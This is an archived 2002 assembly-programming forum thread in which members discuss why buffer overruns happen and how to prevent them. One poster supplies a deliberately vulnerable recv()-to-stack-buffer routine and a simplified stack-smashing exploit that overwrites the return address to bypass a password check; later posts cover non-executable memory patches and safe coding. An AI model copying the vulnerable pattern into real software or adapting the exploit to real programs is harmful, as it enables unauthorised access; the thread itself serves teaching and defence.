@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8" />
+  <title>Let's talk about buffer overruns..... - Forums - ASM Community</title>
+  <link rel="stylesheet" type="text/css" href="../../../style.css" />
+  <link rel="canonical" href="../?id=5311" />
+     </head>
+ <body>
+  <div id="header">
+   <h1><a href="../../../">ASM Community</a></h1>
+  </div>
+  <div id="content">
+   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=5311">Let's talk about buffer overruns.....</a></p>
+   <div class="post" id="post-37563">
+    <div class="subject"><a href="#post-37563">Let's talk about buffer overruns.....</a></div>
+    <div class="body">I will post this here, maybe it will get moved, maybe it won't :) This question is more about coding practices and standards, it is not about 'how do we go out and create these situations?'.<br /><br />It is nearly 2am, and i was thinking: what is the cause of most buffer over-runs? Most of us know what a buffer overrun is (for those who don't, see the explanation below), and most professional programmers should know what they are (except for those who only program in quiche-eating languages like VB and Java), so why do they happen so often?<br /><br />Is it simply that the programmer does not allocate a big enough buffer for the expected info? Is it a typo and they pass the wrong buffer size to a function? Is it caused by the programmer allocating the wrong size buffer, so the API function will fail (as expected), then the programmer fails to resize the buffer correctly? <br /><br />The danger from an overrun is that the excess 'data' will write into the code space and/or stack space. I thought code space was read-only unless the programmer specifically unprotected it? And the chances of overwriting the code space would rely on the allocated buffer always being created at the same memory address, thus overwriting the same code every time. This would also rely on the executing code not being relocated because of base address clashes. And i thought that memory was allocated at a higher address than what the code resided at? Or do overruns primarily affect buffers that are statically allocated in the .code section?<br /><br />And how could a malicious person reliably overwrite the stack? The stack is a predictable size, and should start at a predictable spot, but it seems rather unlikely to me that they could successfully put a valid (and harmful) return address in the right place for it to be popped and used by eip, or that they could insert a parameter in the right place that it could be popped and used in a function?<br /><br />Isn't it funny what one thinks of in the early hours of the morning? :grin: Of course, the big question is: what are the chances that a buffer overrun could be successfully used in a malicious way, as opposed to just causing the app to crash, GPF or behave like crap?<br /><br /><br /><span style="font-size:9px>Note for the newbies: A buffer overrun is when the input data is longer/greater than the amount of memory allocated to hold it. The input data usually comes from an external source, such as user input, a file, a socket, another app or dll, etc. Buffer overruns are usually the cause of most security holes found in applications, such as Internet Explorer. Naturally, you should always try to avoid having these situations in your code :)</span></div>
+    <div class="meta">Posted on 2002-05-10 09:02:25 by sluggy</div>
+   </div>
+   <div class="post" id="post-37573">
+    <div class="subject"><a href="#post-37573">simple buffer overflow exploit</a></div>
+    <div class="body">sluggy,<br /><br />imagine a variable in a stack frame... lets say size 100<br /><br />you left user input data... e enter 108 bytes, and you dont checked the boundaries<br /><br />so, he will have filled the buffer, the value at 104 the PUSH EBP from the stack frame contruction, and the value at 108 the return EIP!!!<br /><br />when the stack frame is released, and the function return, it will jump to the address that was in 108 in buffer... <br /><br />at that address can be something like CALL ESI, JMP EBX or like... and if in this reg point to the start of the buffer(much times is), malicious code can be executed<br /><br />imagine the user filling the buffer with:<br /><br />nop/nop/nop/nop/nop/nop/nop/dd 0x12345678<br /><br />if in 0x12345678 there's a CALL EDI, and EDI still is the start of the buffer, these NOPs will get executed.<br /><br />ancev<br /><br />ps: i cant get more explicit than this without breaking board rules, i guess... but if you need samples or have any question, send a pm</div>
+    <div class="meta">Posted on 2002-05-10 10:06:24 by ancev</div>
+   </div>
+   <div class="post" id="post-37578">
+    <div class="subject"><a href="#post-37578">Let's talk about buffer overruns.....</a></div>
+    <div class="body">ancev or anyone else who's know's,<br />    Do you think you could post an example of bad code which would allow an overflow? I would like to know what  to avoid in my applications. The code doesn't need to be from anything real or usefull. I would just like to see an example of what I've heard so much about.</div>
+    <div class="meta">Posted on 2002-05-10 10:20:30 by emonk</div>
+   </div>
+   <div class="post" id="post-37579">
+    <div class="subject"><a href="#post-37579">Let's talk about buffer overruns.....</a></div>
+    <div class="body">main thing to remember is checking buffer indices... ie, don't just<br />blindly recv() to buffer and update index, remember to check for...<br />*drumroll* ... overflow :).</div>
+    <div class="meta">Posted on 2002-05-10 10:24:48 by f0dder</div>
+   </div>
+   <div class="post" id="post-37592">
+    <div class="subject"><a href="#post-37592">the server</a></div>
+    <div class="body">emonk,<br /><br />there's a sample. using f0dder's recv() idea...<br /><br /><pre><code><br /><br />;this routine query the user, connected via inet,<br />;about his password<br />get_user_name proc<br />   push ebp<br />   mov ebp,esp<br />   sub esp, 32<br /><br />   push 0<br />   push size_askpsw<br />   push ofs askpsw        ;&quot;enter your password&quot;<br />   push dwo &#91;socket&#93;<br />   callW send<br /><br />   lea ebx,&#91;ebp-32&#93;<br /><br />  @@read_input&#58;<br />   push 0<br />   push 32               ;size of our buffer<br />   push ebx<br />   push dwo &#91;socket&#93;<br />   callW recv<br /><br />   cmp eax,-1<br />   je ERROR<br /><br />   test eax,eax<br />   jz @@done_read         ;nothing more to read...<br /><br />   add ebx,eax            ;adjust buffer and<br />   jmp @@read_input      ;keep reading<br />   <br />  @@done_read&#58;<br />   lea ebx,&#91;ebp-32&#93;<br />   push ebx<br />   call CHECK_PASSWORD<br /><br />   leave<br />   ret<br />get_user_name endp<br /><br /></code></pre><br /><br />that code prompt for a password, and read from the socket till there's no more input. then it call some password checking routine... ;)<br /><br />ancev<br /><br />ps: the code probably dont work as is, as i coded it right now, from my head</div>
+    <div class="meta">Posted on 2002-05-10 12:03:45 by ancev</div>
+   </div>
+   <div class="post" id="post-37595">
+    <div class="subject"><a href="#post-37595">the exploit</a></div>
+    <div class="body">re,<br /><br />now, a malicious hacker (lets call him V :tongue: ) want have access to the password-protected thingies, but he dont have a valid password...<br /><br />first, with some research, he discover that the program he want attack know if the user entered the right password by a variable in 0x401234. if its 1, the password entered was the correct.<br /><br />it also discover that the routine that have the exploit(get_user_name), is called in the program from the address 0x404321 (there's a call get_user_name there)<br /><br />so, it code this snippet...<br /><br /><pre><code><br /><br />exploit_code&#58;<br /><br />  db 32-&#40;ofs @@end-ofs @@start&#41; dup &#40;90h&#41;   ;NOPs<br /><br />@@start&#58;<br />  push 1<br />  pop dwo &#91;401234h&#93;    ;set password-ok variable<br />  push 404321h+5<br />  ret                  ;return to after the call<br />@@end&#58;<br /><br />  dd ?<br /><br />  dd 0bff71234h<br /><br />exploit_code_size equ $-ofs exploit_code<br /><br /></code></pre><br /><br />in the 0xbff71234, that is inside a system dll(in preference one that exists in all w32 plataforms at same address), the hacker knows that there's a CALL EBX instruction.<br /><br />now, the hacker, when is prompted by the password, he send that code...<br /><br /><pre><code><br /><br />    push 0<br />    push 32<br />    push ofs buffer<br />    push dwo &#91;socket&#93;<br />    callW recv           ;get the password prompt<br /><br />    push 0<br />    push exploit_code_size   ;32+8<br />    push ofs exploit_code<br />    push dwo &#91;socket&#93;<br />    callW send           ;SEND EXPLOIT!!!<br /><br /></code></pre><br /><br />when the program receive this 'password string', it will read the first 32 bytes in its stack buffer, then, as still there's more input, adjust the buffer pointer, and read again. these new bytes will overwrite the EBP and the RET_ADDRESS values in the stack.<br /><br />the program will call CHECK_PASSWORD, that will fail, coz we dont send a valid password, but then the LEAVE will remove the saved EBP copy in the stack, and the RET will jump to our address, 0xbff71234h!!!<br /><br />the code there will CALL EBX, that is our exploit code.<br /><br />it set the password-ok variable, and return to the address after the call get_user_name. the program now will work as if the hacker had entered a valid password.<br /><br />sorry if i wasnt clear. i hope it help.<br /><br />ancev<br /><br />ps: the code probably dont work as is, as i coded it right now, from my head<br /><br />pps: in real live, things arent that easy, and there are several more that the hacker must check. and more ways to attack a program too :grin:</div>
+    <div class="meta">Posted on 2002-05-10 12:25:11 by ancev</div>
+   </div>
+   <div class="post" id="post-37596">
+    <div class="subject"><a href="#post-37596">Let's talk about buffer overruns.....</a></div>
+    <div class="body">Ahhh..... I think I see. Thank you for the example ancev. <br /><br />-EDIT-never mind the question. I posted at the same time as you were :)</div>
+    <div class="meta">Posted on 2002-05-10 12:29:00 by emonk</div>
+   </div>
+   <div class="post" id="post-37634">
+    <div class="subject"><a href="#post-37634">Let's talk about buffer overruns.....</a></div>
+    <div class="body">ancev brings up a good point, one that i never thought of: strings being passed on the stack. This seems like weak coding to me, what benefit could  it have, apart from speed?</div>
+    <div class="meta">Posted on 2002-05-10 17:33:03 by sluggy</div>
+   </div>
+   <div class="post" id="post-37657">
+    <div class="subject"><a href="#post-37657">Let's talk about buffer overruns.....</a></div>
+    <div class="body">good example ancev.<br /><br />sluggy: um variables are addressed on the stack right? now, when you put a string on a variable, the string would be on the stack, nothing special really.<br /><br />here's a good paper on win32 buffer overflows:<br /><a target="_blank" href="http://phrack.org/show.php?p=55&amp;a=15">http://phrack.org/show.php?p=55&amp;a=15</a><br /><br />might find some tips on how to code apps safely.</div>
+    <div class="meta">Posted on 2002-05-10 20:11:55 by clip</div>
+   </div>
+   <div class="post" id="post-37726">
+    <div class="subject"><a href="#post-37726">Let's talk about buffer overruns.....</a></div>
+    <div class="body">clip,<br />thanks for the link, that is quite some reading. When i commented on passing strings on the stack, i was coming from the angle that i personally have never had to do this, i have always passed a pointer to the string. Maybe i have not coded enough, or maybe i have done things the right way :)<br /><br />I know it is in the standard for some languages that values can be passed 'by value'. When a string needs to be passed by value, maybe a better approach than what is currently used would be to copy the string to a temporary area, then pass the pointer to the temporary string. Realistically, how much work would it take for this method to be coded into the compilers? I know that new code would not necessarily work well with old code when a standard like this is changed, but imagine the security improvement, and the money saved when companies don't have to re-engineer/bug fix products.</div>
+    <div class="meta">Posted on 2002-05-11 07:04:13 by sluggy</div>
+   </div>
+   <div class="post" id="post-37728">
+    <div class="subject"><a href="#post-37728">Let's talk about buffer overruns.....</a></div>
+    <div class="body">buffer struct<br />data db 1024 dup(?)<br />buffer ends<br /><br />BadFunc proc hSocket:dword<br />local localBuffer:buffer<br /><br />Load into buffer from socket <br />without checking for size.<br /><br />Do something with the data.<br /><br /><br />BadFunc endp</div>
+    <div class="meta">Posted on 2002-05-11 07:23:04 by bdjames</div>
+   </div>
+   <div class="post" id="post-37736">
+    <div class="subject"><a href="#post-37736">non-executable data</a></div>
+    <div class="body">sluggy,<br /><br />the ideal, seens to me, is having the system patched to make data be no-exec<br /><br />there are a patch(for linux, at least) that use a quirk to do this. if you try to exec code in data, you get a fault<br /><br />ancev</div>
+    <div class="meta">Posted on 2002-05-11 09:01:49 by ancev</div>
+   </div>
+   <div class="post" id="post-37738">
+    <div class="subject"><a href="#post-37738">Let's talk about buffer overruns.....</a></div>
+    <div class="body">The patch (PAX) works by (ab)using some quirks of pentium (and<br />later) processors - the IA32 doesn't have a native per-page mechanism<br />for setting exec/non-exec. Unfortunately this method has some<br />speed impact. I'd prefer developers being more sensitive to proper<br />coding instead of hoping for some &quot;magic wand&quot; to make problems<br />go away...<br /><br />Btw there's a NT version in beta, if you hang around enough in #win32asm<br />on efnet you'll see it being advertised :).</div>
+    <div class="meta">Posted on 2002-05-11 09:13:49 by f0dder</div>
+   </div>
+   <div class="post" id="post-37788">
+    <div class="subject"><a href="#post-37788">Let's talk about buffer overruns.....</a></div>
+    <div class="body">Talking about buffer overflows, MSN Messenger is in the news for an overflow problem...<br /><br /><a target="_blank" href="http://apnews.excite.com/article/20020509/D7JCT7T00.html">Excite.com - MSN Messenger Vulnerable</a></div>
+    <div class="meta">Posted on 2002-05-11 15:15:52 by JamesE</div>
+   </div>
+   <div class="post" id="post-37815">
+    <div class="subject"><a href="#post-37815">Let's talk about buffer overruns.....</a></div>
+    <div class="body">I do not trust anything from microsoft <br />that connects to the web anymore.<br /><br />MSN (virus) Messenger.<br /><br />So f0dder you have a file server bot up?</div>
+    <div class="meta">Posted on 2002-05-11 20:42:03 by bdjames</div>
+   </div>
+   <div class="post" id="post-37845">
+    <div class="subject"><a href="#post-37845">I never did</a></div>
+    <div class="body">&quot;installed with the XP version of Windows&quot;<br /><br />They should have stuck with One Thing but Greed mess us all up...</div>
+    <div class="meta">Posted on 2002-05-12 00:10:07 by cmax</div>
+   </div>
+   <div class="post" id="post-37861">
+    <div class="subject"><a href="#post-37861">Let's talk about buffer overruns.....</a></div>
+    <div class="body">I'm not the one doing the windows-pax thing. Look for wkraker,<br />or variations of that nick.</div>
+    <div class="meta">Posted on 2002-05-12 02:37:33 by f0dder</div>
+   </div>
+   <div class="post" id="post-37889">
+    <div class="subject"><a href="#post-37889">Let's talk about buffer overruns.....</a></div>
+    <div class="body">sluggy:<br /><br />First I would like to say, I'm sure you are a well experienced programmer and I apologize if my reply had insulted your intelligence in any way, for I did not get your question quite right.  :)<br /><br />as f0dder was saying, just be sensitive to proper coding :alright: In my opinion, just make the compiler aware of buffer-overflows :) Something like a smart compiler that checks the source code to see if it would produce bufferoverflow(s), alert the programmer and advice a solution (use strncpy instead of strcpy, etc). In some security-oriented modifications of gcc in linux, something like this is applied, very useful aid.<br /><br />windows pax? cool, I just checked out the pax team page, and there is such an implementation of pax now. I hope to read more  about it :)<br /><br />pax team homepage for those interested:<br /><a target="_blank" href="http://pageexec.virtualave.net/">http://pageexec.virtualave.net/</a></div>
+    <div class="meta">Posted on 2002-05-12 11:16:21 by clip</div>
+   </div>
+   <div class="post" id="post-37959">
+    <div class="subject"><a href="#post-37959">Let's talk about buffer overruns.....</a></div>
+    <div class="body"><div class="quote"><em>First I would like to say, I'm sure you are a well experienced programmer and I apologize if my reply had insulted your intelligence in any way</em></div>Not at all, no offence taken :)<br /><br />In my asm programming, i always pass strings By Reference, thus avoiding the overrun possibility. However, i do a lot of programming in VB, and strings are passed ByRef by default, but i always override that and pass them ByVal. Which means that the strings are probably sitting on the stack :eek: Which also means that there is a HUGE amount of software out there that is vulnerable to buffer overruns. I know that this problem could be blamed on whoever invented the standard for string parameter passing, but i wonder if MS (for instance) could be liable for damages as a compiler maker, because while they didn't invent the standard, they certainly know of the inherent problems and have done nothing to change them. Mmmph, lets all sue MS in a class action for billions of dollars :grin:</div>
+    <div class="meta">Posted on 2002-05-12 19:27:10 by sluggy</div>
+   </div>
+   <div class="post" id="post-37999">
+    <div class="subject"><a href="#post-37999">Let's talk about buffer overruns.....</a></div>
+    <div class="body">The C and C++ languages give the programmer the responsibility of avoiding buffer overruns. The ability to remove checks by programmers allows them to fine tune an algorithm for speed. There is little that MS can do for other programmers except provide classes (like CString) that always does the overrun checking.<br /><br />Passing only buffer pointers does not prevent buffer overruns. Leaving the buffer unmodified by the subroutine prevents overruns. Otherwise, you must provide bounds information (and use them), or impose strict limits (and possibly waste space doing it).</div>
+    <div class="meta">Posted on 2002-05-13 02:20:50 by tenkey</div>
+   </div>
+  </div>
+ </body>
+</html>
